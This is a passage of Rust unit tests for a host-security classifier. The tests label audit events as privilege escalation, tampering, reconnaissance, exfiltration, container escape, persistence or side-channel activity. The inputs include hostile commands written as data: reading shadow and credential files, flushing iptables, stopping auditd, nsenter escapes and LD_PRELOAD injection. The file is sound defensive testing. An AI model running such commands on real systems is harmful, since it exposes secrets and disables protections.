        let event = make_exec_event(&["cat", "/etc/shadow"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
    }

    #[test]
    fn test_cat_etc_sudoers() {
        let event = make_exec_event(&["cat", "/etc/sudoers"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
    }

    #[test]
    fn test_write_etc_passwd() {
        let event = make_exec_event(&["tee", "/etc/passwd"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
    }

    #[test]
    fn test_vim_etc_hosts() {
        let event = make_exec_event(&["vim", "/etc/hosts"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
    }

    #[test]
    fn test_openat_shadow_syscall() {
        let event = make_syscall_event("openat", "/etc/shadow");
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
    }

    #[test]
    fn test_unlinkat_passwd() {
        let event = make_syscall_event("unlinkat", "/etc/passwd");
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
    }

    // --- Security Tamper ---

    #[test]
    fn test_ufw_disable() {
        let event = make_exec_event(&["ufw", "disable"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
    }

    #[test]
    fn test_iptables_flush() {
        let event = make_exec_event(&["iptables", "-F"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
    }

    #[test]
    fn test_stop_auditd() {
        let event = make_exec_event(&["systemctl", "stop", "auditd"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
    }

    #[test]
    fn test_stop_apparmor() {
        let event = make_exec_event(&["systemctl", "disable", "apparmor"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
    }

    // --- Reconnaissance ---

    #[test]
    fn test_whoami_recon() {
        let event = make_exec_event(&["whoami"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::Reconnaissance, Severity::Warning)));
    }

    #[test]
    fn test_id_recon() {
        let event = make_exec_event(&["id"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::Reconnaissance, Severity::Warning)));
    }

    #[test]
    fn test_uname_recon() {
        let event = make_exec_event(&["uname", "-a"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::Reconnaissance, Severity::Warning)));
    }

    #[test]
    fn test_cat_env_file() {
        let event = make_exec_event(&["cat", "/home/user/.env"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::Reconnaissance, Severity::Warning)));
    }

    #[test]
    fn test_cat_aws_credentials() {
        let event = make_exec_event(&["cat", "/home/user/.aws/credentials"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::DataExfiltration, Severity::Warning)));
    }

    #[test]
    fn test_cat_ssh_key() {
        let event = make_exec_event(&["cat", "/home/user/.ssh/id_rsa"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::Reconnaissance, Severity::Warning)));
    }

    #[test]
    fn test_openat_env_file() {
        let event = make_syscall_event("openat", "/opt/app/.env");
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::Reconnaissance, Severity::Warning)));
    }

    // --- Benign ---

    #[test]
    fn test_ls_is_benign() {
        let event = make_exec_event(&["ls", "-la", "/tmp"]);
        let result = classify_behavior(&event);
        assert_eq!(result, None);
    }

    #[test]
    fn test_cat_normal_file() {
        let event = make_exec_event(&["cat", "/tmp/notes.txt"]);
        let result = classify_behavior(&event);
        assert_eq!(result, None);
    }

    #[test]
    fn test_openat_normal_file() {
        let event = make_syscall_event("openat", "/tmp/something");
        let result = classify_behavior(&event);
        assert_eq!(result, None);
    }

    // --- Side-Channel Attack Detection ---

    #[test]
    fn test_sidechannel_tool_mastik() {
        let event = make_exec_event(&["mastik", "--attack-type", "flush-reload"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SideChannel, Severity::Critical)));
    }

    #[test]
    fn test_sidechannel_tool_flush_reload() {
        let event = make_exec_event(&["flush-reload", "/usr/lib/x86_64-linux-gnu/libcrypto.so.1.1"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SideChannel, Severity::Critical)));
    }

    #[test]
    fn test_sidechannel_tool_prime_probe() {
        let event = make_exec_event(&["prime-probe", "--target", "aes"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SideChannel, Severity::Critical)));
    }

    #[test]
    fn test_sidechannel_tool_sgx_step() {
        let event = make_exec_event(&["sgx-step", "--victim", "/opt/enclave.so"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SideChannel, Severity::Critical)));
    }

    #[test]
    fn test_sidechannel_tool_cache_attack() {
        let event = make_exec_event(&["cache-attack", "--L1d", "--target", "openssl"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SideChannel, Severity::Critical)));
    }

    #[test]
    fn test_perf_event_open_syscall() {
        let mut event = make_syscall_event("perf_event_open", "");
        event.file_path = None; // perf_event_open doesn't involve file paths
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SideChannel, Severity::Warning)));
    }

    #[test]
    fn test_access_proc_kcore() {
        let event = make_exec_event(&["cat", "/proc/kcore"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::DataExfiltration, Severity::Critical)));
    }

    #[test]
    fn test_access_proc_kallsyms() {
        let event = make_exec_event(&["cat", "/proc/kallsyms"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::Reconnaissance, Severity::Warning)));
    }

    #[test]
    fn test_access_cpu_vulnerabilities() {
        let event = make_exec_event(&["cat", "/sys/devices/system/cpu/vulnerabilities/spectre_v1"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::Reconnaissance, Severity::Warning)));
    }

    #[test]
    fn test_openat_proc_kcore_syscall() {
        let event = make_syscall_event("openat", "/proc/kcore");
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
    }

    #[test]
    fn test_openat_proc_kallsyms_syscall() {
        let event = make_syscall_event("openat", "/proc/kallsyms");
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::Reconnaissance, Severity::Warning)));
    }

    #[test]
    fn test_cachegrind_not_flagged_as_sidechannel() {
        // cachegrind is a legitimate profiling tool (valgrind --tool=cachegrind)
        // It's not in SIDECHANNEL_TOOLS, so it should not be flagged
        let event = make_exec_event(&["cachegrind", "--trace", "/tmp/program"]);
        let result = classify_behavior(&event);
        assert_eq!(result, None);
    }

    // --- Container Escape Detection ---

    #[test]
    fn test_nsenter_is_container_escape() {
        let event = make_exec_event(&["nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
    }

    #[test]
    fn test_docker_socket_access() {
        let event = make_syscall_event("openat", "/var/run/docker.sock");
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
    }

    #[test]
    fn test_proc_1_root_escape() {
        let event = make_exec_event(&["cat", "/proc/1/root/etc/shadow"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
    }

    #[test]
    fn test_mount_host_root() {
        let event = make_exec_event(&["mount", "/dev/sda1", "/mnt"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
    }

    #[test]
    fn test_unshare_escape() {
        let event = make_exec_event(&["unshare", "--mount", "--pid", "--fork", "bash"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
    }

    // --- Persistence Detection ---

    #[test]
    fn test_crontab_is_persistence() {
        let event = make_exec_event(&["crontab", "-e"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
    }

    #[test]
    fn test_crontab_list_is_not_persistence() {
        let event = make_exec_event(&["crontab", "-l"]);
        let result = classify_behavior(&event);
        assert_eq!(result, None);
    }

    #[test]
    fn test_crontab_list_user_is_not_persistence() {
        let event = make_exec_event(&["crontab", "-l", "-u", "redis"]);
        let result = classify_behavior(&event);
        assert_eq!(result, None);
    }

    #[test]
    fn test_at_is_persistence() {
        let event = make_exec_event(&["at", "now", "+", "1", "hour"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
    }

    #[test]
    fn test_systemctl_enable_is_persistence() {
        let event = make_exec_event(&["systemctl", "enable", "evil-service"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Warning)));
    }

    #[test]
    fn test_write_cron_d() {
        let event = make_syscall_event("openat", "/etc/cron.d/evil-job");
        let result = classify_behavior(&event);
        // Should match persistence path
        assert!(result.is_some());
    }

    #[test]
    fn test_write_systemd_service() {
        let event = make_syscall_event("unlinkat", "/etc/systemd/system/evil.service");
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
    }

    // --- Environment Variable Exfiltration Detection ---

    #[test]
    fn test_cat_proc_environ() {
        let event = make_exec_event(&["cat", "/proc/self/environ"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical)));
    }

    #[test]
    fn test_openat_proc_environ() {
        let event = make_syscall_event("openat", "/proc/1234/environ");
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::DataExfiltration, Severity::Critical)));
    }

    #[test]
    fn test_proc_mem_access() {
        let event = make_syscall_event("openat", "/proc/self/mem");
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::DataExfiltration, Severity::Critical)));
    }

    #[test]
    fn test_strings_proc_environ() {
        let event = make_exec_event(&["strings", "/proc/1/environ"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::DataExfiltration, Severity::Critical)));
    }

    #[test]
    fn test_xxd_proc_maps() {
        let event = make_exec_event(&["xxd", "/proc/self/maps"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::DataExfiltration, Severity::Critical)));
    }

    // --- LD_PRELOAD Bypass Detection ---

    #[test]
    fn test_modify_ld_preload_file() {
        let event = make_exec_event(&["vim", "/etc/ld.so.preload"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
    }

    #[test]
    fn test_set_ld_preload_env() {
        let event = make_exec_event(&["env", "LD_PRELOAD=/tmp/evil.so", "bash"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
    }

    #[test]
    fn test_direct_linker_invocation() {
        let event = make_exec_event(&["ld-linux-aarch64.so.1", "--preload", "/tmp/evil.so", "/usr/bin/curl"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
    }

    #[test]
    fn test_static_compilation() {
        // gcc is a build tool, so -static is suppressed; but an unknown binary with -static is flagged
        let event = make_exec_event(&["gcc", "-static", "-o", "bypass", "bypass.c"]);
        let result = classify_behavior(&event);
        // gcc itself is in BUILD_TOOL_BASES, so static compile is not flagged as tamper
        assert!(result.is_none() || result.unwrap().0 != BehaviorCategory::SecurityTamper,
            "gcc -static should not be SEC_TAMPER (it's a build tool)");
    }

    #[test]
    fn test_static_compilation_unknown_binary() {
        // An unknown binary compiling statically IS suspicious
        let event = make_exec_event(&["evil-compiler", "-static", "-o", "bypass", "bypass.c"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Warning)));
    }

    #[test]
    fn test_gdb_debugger() {
        let event = make_exec_event(&["gdb", "-p", "1234"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
    }

    #[test]
    fn test_strace_bypass() {
        let event = make_exec_event(&["strace", "-f", "-p", "1234"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
    }

    #[test]
    fn test_musl_static_compile() {
        let event = make_exec_event(&["musl-gcc", "-o", "static-binary", "evil.c"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Warning)));
    }

    #[test]
    fn test_linker_not_flagged_as_tamper() {
        let event = make_exec_event(&["/usr/bin/ld", "-plugin", "/usr/libexec/gcc/aarch64-linux-gnu/14/liblto_plugin.so", "-dynamic-linker", "/lib/ld-linux-aarch64.so.1", "-o", "output"]);
        let result = classify_behavior(&event);
        assert!(result.is_none() || result.unwrap().0 != BehaviorCategory::SecurityTamper, 
            "Normal linker invocation should not be flagged as SEC_TAMPER");
    }

    #[test]
    fn test_dynamic_linker_suppressed_when_parent_is_cargo() {
        let event = make_exec_event_with_parent(
            &["ld-linux-aarch64.so.1", "--preload", "/tmp/evil.so", "/usr/bin/curl"],
            "/home/user/.cargo/bin/cargo",
        );
        let result = classify_behavior(&event);
        assert_eq!(result, None, "Dynamic linker invoked by cargo should be suppressed");
    }

    #[test]
    fn test_dynamic_linker_not_suppressed_without_build_parent() {
        let event = make_exec_event_with_parent(
            &["ld-linux-aarch64.so.1", "--preload", "/tmp/evil.so", "/usr/bin/curl"],
            "/usr/bin/bash",
        );
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)));
    }

    #[test]
    fn test_ld_preload_suppressed_when_parent_is_gcc() {
        let event = make_exec_event_with_parent(
            &["bash", "-c", "echo ld-linux something"],
            "/usr/bin/gcc",
        );
        let result = classify_behavior(&event);
        assert_eq!(result, None, "LD_PRELOAD pattern from gcc child should be suppressed");
    }

    #[test]
    fn test_collect2_not_flagged_as_tamper() {
        let event = make_exec_event(&["/usr/libexec/gcc/aarch64-linux-gnu/14/collect2", "-plugin", "liblto_plugin.so", "-dynamic-linker", "/lib/ld-linux-aarch64.so.1", "-o", "output"]);
        let result = classify_behavior(&event);
        assert!(result.is_none() || result.unwrap().0 != BehaviorCategory::SecurityTamper,
            "collect2 should not be flagged as SEC_TAMPER");
    }

    // --- LD_PRELOAD env var detection (raw audit record) ---

    #[test]
    fn test_ld_preload_env_detected_in_raw() {
        let mut event = make_exec_event(&["ls", "-la"]);
        event.raw = "type=EXECVE msg=audit(1234): argc=2 a0=\"ls\" a1=\"-la\" LD_PRELOAD=/tmp/evil.so".to_string();
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::SecurityTamper, Severity::Critical)),
            "LD_PRELOAD in raw audit record should be detected");
    }

    #[test]
    fn test_ld_preload_env_suppressed_for_build_tools() {
        let mut event = make_exec_event(&["gcc", "test.c", "-o", "test"]);
        event.raw = "type=EXECVE msg=audit(1234): LD_PRELOAD=/usr/lib/libasan.so".to_string();
        let result = classify_behavior(&event);
        assert!(result.is_none() || result.unwrap().0 != BehaviorCategory::SecurityTamper,
            "Build tools using LD_PRELOAD should be suppressed");
    }

    #[test]
    fn test_ld_preload_env_suppressed_for_build_parent() {
        let mut event = make_exec_event_with_parent(&["ls"], "/usr/bin/make");
        event.raw = "type=EXECVE LD_PRELOAD=/usr/lib/libasan.so".to_string();
        let result = classify_behavior(&event);
        assert!(result.is_none() || result.unwrap().0 != BehaviorCategory::SecurityTamper,
            "LD_PRELOAD from build tool parent should be suppressed");
    }

    #[test]
    fn test_static_compile_suppressed_for_gcc() {
        let event = make_exec_event(&["gcc", "-static", "-o", "test", "test.c"]);
        let result = classify_behavior(&event);
        assert!(result.is_none() || result.unwrap().0 != BehaviorCategory::SecurityTamper,
            "gcc -static should not be flagged as SEC_TAMPER");
    }

    #[test]
    fn test_compiler_suppressed_when_parent_is_cargo() {
        let event = make_exec_event_with_parent(
            &["cc", "test.c", "-o", "test"],
            "/home/user/.cargo/bin/cargo",
        );
        let result = classify_behavior(&event);
        assert!(result.is_none(),
            "cc invoked by cargo should be fully suppressed");
    }
}

